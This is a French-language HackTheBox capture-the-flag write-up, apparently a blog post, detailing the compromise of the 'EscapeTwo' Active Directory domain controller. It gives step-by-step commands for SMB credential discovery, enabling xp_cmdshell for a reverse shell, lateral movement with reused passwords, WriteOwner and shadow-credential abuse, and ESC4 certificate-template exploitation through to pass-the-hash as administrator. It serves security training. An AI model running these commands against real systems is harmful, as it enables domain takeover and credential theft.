---
date: 2025-05-25T10:56:05-05:00
# description: ""
image: "/images/HTB-Administrator/EscapeTwo.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: EscapeTwo"
type: "post"
---

* Platforme: HackTheBox
* Lien: [EscapeTwo](https://app.hackthebox.com/machines/EscapeTwo)
* Niveau: Facile
* OS: Windows
---

> Nous disposons des informations d'identification pour le compte suivant: **Username:** rose **Password:** KxEPkKe6R8su.

EscapeTwo est un test d'intrusion de type "gray box" ciblant un contrôleur de domaine Active Directory. À l'aide des identifiants initiaux, nous découvrons un fichier contenant les identifiants de la base de données. Ceux-ci sont utilisés pour activer et exploiter `xp_cmdshell`, ce qui permet l'exécution de commandes à distance et un accès initial au système.

L'énumération post-exploitation révèle des identifiants supplémentaires stockés dans un fichier de configuration. Ils sont utilisés pour se déplacer latéralement vers un utilisateur du domaine. Grâce à Bloodhound, nous découvrons que le compte compromis possède les droits `WriteOwner` sur un compte de service. En exploitant cette erreur de configuration, nous prenons le contrôle du compte de service que nous utilisons pour exploiter la voie d'attaque ESC4, ce qui nous donne un accès administratif complet.

## Balayage

```
nmap -sC -sV -Pn -oA nmap/EscapeTwo {IP}
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-11 15:57 CST
Nmap scan report for 10.129.33.0
Host is up (0.060s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus

88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-11 21:58:09Z)

135/tcp  open  msrpc         Microsoft Windows RPC

139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn

389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.

445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0

636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.

1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.33.0:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-11T19:22:43
|_Not valid after:  2055-01-11T19:22:43
| ms-sql-ntlm-info: 
|   10.129.33.0:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.

3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.

3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-11T21:58:50
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.32 seconds
```

La cible est un contrôleur de domaine Active Directory avec les services habituels tels que LDAP, SMB, en plus de Microsoft SQL.

Nous avons également quelques noms de domaine que nous ajoutons au fichier `/etc/hosts`.

```
sudo echo "TARGET_IP sequel.htb DC01.sequel.htb DC01" | sudo tee -a /etc/hosts
```

## Enumération

Nous utilisons les identifiants fournis pour énumérer les partages disponibles.

```
netexec smb TARGET_IP -u rose -p 'KxEPkKe6R8su' --shares
```

![SMB shares enumeration](/images/HTB-EscapeTwo/rose_smb.png)

Nous avons accès à certaines partages, examinons le dossier `Accounting Department`. À l'intérieur, nous trouvons deux fichiers que nous téléchargeons : ` accounting_2024.xlsx` et `accounts.xlsx`.

```
smbclient //sequel.htb/'Accounting Department' -U rose
```

![acct dept share access](/images/HTB-EscapeTwo/acc_dpt_share.png)

À l'intérieur de `accounts.xlsx` nous trouvons plusieurs fichiers.

![accounts.xlsx file](/images/HTB-EscapeTwo/creds_file.png)

Nous pouvons lire le fichier `sharedStrings.xml` où se trouvent les identifiants du compte `sa`.

> Le compte `sa`, ou compte administrateur système, est un compte intégré à SQL Server qui donne à l'utilisateur un accès administratif complet à l'instance SQL Server.

![sa account credentials](/images/HTB-EscapeTwo/sa_creds.png)

À l'aide de la commande ci-dessous, nous nous connectons à la base de données.

```
impacket-mssqlclient 'sequel.htb/sa:MSSQLP@ssw0rd!@sequel.htb'
```

![mssql login](/images/HTB-EscapeTwo/mssql_login.png)

## Accès Initial

Nous activons `xp_cmdshell` à l'aide des requêtes suivantes.

> `xp_cmdshell` est une fonctionnalité puissante de Microsoft SQL Server qui permet d'exécuter des commandes du système d'exploitation directement à partir de SQL Server.

```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

![enable xp_cmdshell](/images/HTB-EscapeTwo/xp_cmdshell_enabled.png)

Nous testons avec `EXEC xp_cmdshell 'whoami';`. 

![xp_cmdshell test](/images/HTB-EscapeTwo/xp_cmdshell_test.png)

Nous exploitons mssql pour obtenir un shell inversé. Sur [revshells](https://www.revshells.com/) nous utilisons `PowerShell #3 (Base64)`.

```
xp_cmdshell REVERSE_SHELL_COMMAND
```

![mssql reverse shell](/images/HTB-EscapeTwo/mssql_revshell.png)

Sur notre listener, nous obtenons une connexion sous le nom `sql_svc`.


![foothold](/images/HTB-EscapeTwo/foothold.png)

### Shell en tant que ryan

Nous observons l'utilisateur `ryan` en plus de `Administrator`.

![users list](/images/HTB-EscapeTwo/users_list.png)

Dans `C:\SQL2019\ExpressAdv_ENU`, nous trouvons `sql-Configuration.INI` contenant un autre mot de passe `WqSZAF6CysDQbGb3`.

![sql config password](/images/HTB-EscapeTwo/sqlsvc_pwd.png)

Grâce à ce mot de passe, nous pouvons nous connecter en tant que `ryan`.

```
evil-winrm -i sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3'
```

![ryan login](/images/HTB-EscapeTwo/ryan_login.png)

Le drapeau utilisateur se trouve dans `C:\Users\ryan\Desktop`.

## Elévation de Privilèges

Continuons l'énumération avec BloodHound.

```
bloodhound-python -c all -u ryan -p 'WqSZAF6CysDQbGb3' -d sequel.htb -dc dc01.sequel.htb -ns 10.129.33.0
```

![bloodhound enumeration](/images/HTB-EscapeTwo/bloodhound.png) 

```
sudo neo4j start
bloodhound --no-sandbox
```

Ryan dispose de l'autorisation `WriteOwner` sur `CA_SVC`, que nous pouvons utiliser pour prendre le contrôle du compte.

![ryan WriteOwner](/images/HTB-EscapeTwo/ryan_WriteOwner.png)

![WriteOwner help](/images/HTB-EscapeTwo/WriteOwner_help.png)

En vérifiant les informations du compte, nous apprenons que `ca_svc` fait partie du groupe `Cert Publishers`.

![ca_svc account info](/images/HTB-EscapeTwo/ca_svc_group.png)

Nous trouvons plus d'informations sur ce groupe à la page de documentation Microsoft disponible [ici](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups).

![cert publishers group info](/images/HTB-EscapeTwo/cert_publishers_group.png)

Notre exploitation se déroulera en deux étapes principales. Tout d'abord, nous devons prendre le contrôle de `ca_svc`, ce que nous pouvons faire grâce à `WriteOwner`. La deuxième étape consiste à exploiter les services de certificats Active Directory (ADCS).

1. Obtenir la propriété du compte `ca_svc`.

```
bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' set owner ca_svc ryan
```

![bloodyAD](/images/HTB-EscapeTwo/bloodyAD.png)

2. Accorder à `ryan` le contrôle total sur `ca_svc`.

> Vous pouvez télécharger `dacledit.py` [ici](https://github.com/fortra/impacket/blob/master/examples/dacledit.py).

```
python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
```

![dacledit](/images/HTB-EscapeTwo/dacledit.png)


3. Exploiter `ca_svc` via les Shadow Credentials. _Plus d'informations [ici](https://i-tracing.com/fr/blog/configuration-dacl-attaque-shadow-credentials/)._

```
certipy-ad shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip {ip} -ns {ip} -target dc01.sequel.htb -account ca_svc
```

![shadow credentials exploit](/images/HTB-EscapeTwo/certipy_shadow.png)


4. Énumérer les modèles de certificats vulnérables.

```
KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip {ip} -vulnerable -stdout
```

![certificate enumeration](/images/HTB-EscapeTwo/vulnerable_template.png)

![template name](/images/HTB-EscapeTwo/Template_Name.png)

![ESC4](/images/HTB-EscapeTwo/ESC4.png)

5. Abuser du modèle de certificat vulnérable.

```
KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip {ip}
```

![Template Abuse](/images/HTB-EscapeTwo/Template_Abuse.png)

6. Demander un certificat pour l'administrateur.

```
certipy-ad req -u ca_svc -hashes {ca_svc_hash} -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip {ip} -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns {ip} -dns {ip}
```

![certificate request](/images/HTB-EscapeTwo/certificate_request.png)

7. S'authentifier en tant qu'administrateur à l'aide du certificat.

```
certipy-ad auth -pfx ./administrator.pfx -dc-ip {ip}
```

![Admin hash](/images/HTB-EscapeTwo/Admin_hash.png)

8. Connectez-vous en tant qu'administrateur.

```
evil-winrm -i dc01.sequel.htb -u administrator -H {admin_hash}
```

![Admin login](/images/HTB-EscapeTwo/root_flag.png)

Merci d'avoir lu cet article! Si vous souhaitez en savoir plus sur l'attaque ESC4 et comment l'exploiter, consultez [cet article](https://www.vaadata.com/blog/fr/securite-ad-cs-comprendre-et-exploiter-les-techniques-esc/#aioseo-esc4-un-grand-pouvoir-implique-de-grandes-responsabilites).





